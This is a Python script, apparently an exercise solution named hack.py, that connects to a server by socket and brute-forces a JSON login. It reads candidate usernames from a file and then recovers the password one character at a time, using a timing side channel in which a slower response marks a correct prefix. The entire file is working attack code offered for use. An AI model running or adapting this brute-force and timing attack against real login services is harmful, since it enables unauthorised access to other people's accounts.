import itertools
import socket
import sys
import json
from time import perf_counter
from string import ascii_lowercase, ascii_uppercase, digits


class Remote:
    def __init__(self):
        self.client_socket = socket.socket()
        self.max_attempts = 1000000    
        self.buffer = 1024
        self.attempts = 0
        self.lag = 0
        self.max_lag = 0.1
        self.msg = ''
        self.login_pkg = {"login": '', "password": ' '}

    @staticmethod
    def argv():
        """Used to call arguments from the command line"""
        if (len(sys.argv) != 3) or ('-h' in sys.argv):
            print('Usage: hack.py address port message')
            sys.exit()
        else:
            try:
                ipaddress, port = sys.argv[1], sys.argv[2]
                return ipaddress, int(port)
            except ValueError:
                print(f'The argument "port" should be a number, arg was: {sys.argv[2]}')
                sys.exit()

    @staticmethod
    def pass_library():
        """Attempts passwords from text file with case substitution"""
        file = open('passwords.txt', 'rt')
        passwords = file.readlines()
        file.close()
        for password in passwords:
            if not password.isdigit():
                for attempt in itertools.product(
                        *([letter.lower(), letter.upper()] for letter in password.strip("\n"))):
                    yield "".join(attempt)
            else:
                yield password

    @staticmethod
    def login_library():
        """Attempts logins from text file"""
        file = open('logins.txt', 'rt')
        logins = file.readlines()
        file.close()
        for login in logins:
            yield login.strip('\n')

    def generate(self, seed=''):
        """Generates passwords in sequence start from 'a'"""
        pool = ascii_lowercase + ascii_uppercase + digits
        while self.msg != 'Connection success!':
            for char in pool:
                yield seed + char

    def connect(self, address: tuple):
        """Connect to the host"""
        self.client_socket.connect(address)

    def disconnect(self):
        """Close the connection to the host"""
        self.client_socket.close()

    def send(self, pkg):
        """Sends a message (str) to the host and returns the response (str)"""
        start = perf_counter()
        self.client_socket.send((json.dumps(pkg)).encode())
        self.msg = json.loads(self.client_socket.recv(self.buffer).decode())['result']
        end = perf_counter()
        self.lag = end - start

    def brute(self):
        """Attempt brute force attacks. Returns the password or error. Takes """
        login_source = self.login_library()
        pass_source = self.generate()
        while self.attempts < self.max_attempts:

            if (self.msg == '') or (self.msg == 'Wrong login!'):
                self.login_pkg['login'] = next(login_source)
                self.send(self.login_pkg)
            elif self.msg == 'Wrong password!':
                if self.lag <= self.max_lag:
                    self.login_pkg['password'] = next(pass_source)
                    self.send(self.login_pkg)
                else:
                    pass_source = self.generate(self.login_pkg['password'])
                    self.login_pkg['password'] = next(pass_source)
                    self.send(self.login_pkg)
            elif self.msg == 'Connection success!':
                return json.dumps(self.login_pkg)


if __name__ == '__main__':

    terminal = Remote()
    host = terminal.argv()
    terminal.connect(host)
    print(terminal.brute())
    terminal.disconnect()
